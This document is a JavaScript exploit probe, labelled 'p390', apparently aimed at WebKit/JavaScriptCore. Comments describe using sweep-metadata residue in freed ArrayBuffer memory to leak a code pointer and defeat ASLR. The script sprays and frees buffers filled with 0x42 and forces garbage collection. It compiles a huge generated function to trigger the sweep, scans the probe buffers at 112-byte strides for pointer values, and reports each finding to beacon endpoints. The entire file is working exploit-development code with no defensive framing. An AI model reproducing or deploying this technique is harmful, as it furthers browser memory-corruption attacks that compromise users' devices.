// p390 - ArrayBuffer data scan for sweep residue
//
// ArrayBuffer backing stores go through Gigacage::tryMalloc -> fastMalloc (Gigacage disabled).
// 100KB+ AB is marge tier = in the sweep path.
// The sweep writes metadata at 112-byte stride through the data.
// Key write: entry+24 = thunk CODE POINTER (8 bytes) = ASLR leak if readable.
//
// Fill AB with 0x42 ('B'), trigger sweep, scan for non-0x42 bytes.
// Check specifically at 112-byte stride offsets +12, +24, +64, +68.
//
// Beacon prefix: V390-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V390-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V390-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var workerCode = function() {
    var baits = [];
    var probes = [];
    var probeViews = [];
    var baseUrl = '';
    var AB_SIZE = 131072; // 128KB = well into marge tier

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V390-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
    function hex16(arr, off, len) {
      var s = '';
      for (var i = 0; i < len && (off + i) < arr.length; i++) s += hexByte(arr[off + i]);
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // 20 bait ABs
        for (var i = 0; i < 20; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          var v = new Uint8Array(ab);
          for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42; // fill with 'B'
          baits.push(ab);
        }
        beacon('BAITS-' + baits.length);

        // 10 probe ABs
        for (var i = 0; i < 10; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          var v = new Uint8Array(ab);
          for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42; // fill with 'B'
          probes.push(ab);
          probeViews.push(v);
        }
        beacon('PROBES-' + probes.length);

        // Free baits
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = [];
        beacon('FREED');
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var totalNonB = 0;
        var probesCorrupted = 0;
        var probesIntact = 0;

        for (var pi = 0; pi < probes.length; pi++) {
          try {
            var v = probeViews[pi];
            var len = v.length;

            // FULL SCAN: check every byte for non-0x42
            var nonB = [];
            for (var j = 0; j < len; j++) {
              if (v[j] !== 0x42) {
                nonB.push(j);
                if (nonB.length <= 20) {
                  beacon('P' + pi + '-NONB-' + j + '-' + hexByte(v[j]));
                }
              }
            }

            if (nonB.length === 0) {
              probesIntact++;
              beacon('P' + pi + '-INTACT');
              continue;
            }

            probesCorrupted++;
            beacon('P' + pi + '-HIT-' + nonB.length);
            totalNonB += nonB.length;

            // Check stride pattern
            if (nonB.length >= 2) {
              var diffs = [];
              for (var k = 1; k < Math.min(nonB.length, 10); k++) {
                diffs.push(nonB[k] - nonB[k-1]);
              }
              beacon('P' + pi + '-DIFFS-' + diffs.join(','));
            }

            // Read 8 bytes at first 5 non-B positions (potential pointers)
            for (var k = 0; k < Math.min(nonB.length, 5); k++) {
              var pos = nonB[k];
              beacon('P' + pi + '-BYTES-' + pos + '-' + hex16(v, pos, 8));
            }

            // STRIDE SCAN: check at 112-byte intervals for known write offsets
            // For each stride, check +12 (0xFFFFFFFF), +24 (thunk 8B), +64 (bits), +68 (bci)
            var strideHits = 0;
            for (var stride = 0; stride < len; stride += 112) {
              // Check entry+24 specifically (thunk pointer, 8 bytes)
              if (stride + 31 < len) {
                var hasThunk = false;
                for (var b = 24; b < 32; b++) {
                  if (v[stride + b] !== 0x42) { hasThunk = true; break; }
                }
                if (hasThunk && strideHits < 5) {
                  // Read 8 bytes as potential code pointer
                  beacon('P' + pi + '-THUNK-' + stride + '-' + hex16(v, stride + 24, 8));
                  strideHits++;
                }
              }
            }
            beacon('P' + pi + '-STRIDEHITS-' + strideHits);

            // Also read via Float64Array for precise pointer extraction
            var f64 = new Float64Array(probes[pi]);
            // Each 112-byte entry = 14 Float64s. Thunk at entry+24 = float64 index 3
            var ptrFinds = 0;
            for (var entry = 0; entry * 112 + 31 < len; entry++) {
              var byteOff = entry * 112 + 24;
              var f64idx = byteOff / 8;
              if (f64idx === Math.floor(f64idx) && f64idx < f64.length) {
                var val = f64[f64idx];
                // Check if non-zero and non-'BBBBBBBB' pattern
                if (val !== 0 && !isNaN(val)) {
                  // Convert to hex via DataView
                  var dv = new DataView(probes[pi]);
                  var hi = dv.getUint32(byteOff + 4, true);
                  var lo = dv.getUint32(byteOff, true);
                  if (hi !== 0x42424242 || lo !== 0x42424242) {
                    if (ptrFinds < 5) {
                      var hexHi = ('00000000' + hi.toString(16)).slice(-8);
                      var hexLo = ('00000000' + lo.toString(16)).slice(-8);
                      beacon('P' + pi + '-PTR-' + byteOff + '-' + hexHi + hexLo);
                    }
                    ptrFinds++;
                  }
                }
              }
            }
            if (ptrFinds > 0) beacon('P' + pi + '-PTRFINDS-' + ptrFinds);

          } catch(ex) {
            beacon('P' + pi + '-CRASH-' + (ex.message || '').substring(0, 30));
          }
        }

        beacon('SUMMARY-CORRUPT' + probesCorrupted + '-INTACT' + probesIntact + '-NONB' + totalNonB);
        beacon('ALL-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('WORKER-SCAN-DONE');
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p390fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p390ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p390ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
